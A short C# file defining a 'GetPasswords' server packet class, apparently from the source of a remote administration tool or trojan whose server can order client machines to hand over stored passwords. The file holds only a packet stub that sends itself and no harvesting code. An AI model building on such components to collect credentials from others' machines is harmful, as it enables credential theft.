using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetPasswords : IPacket
    {
        public GetPasswords()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
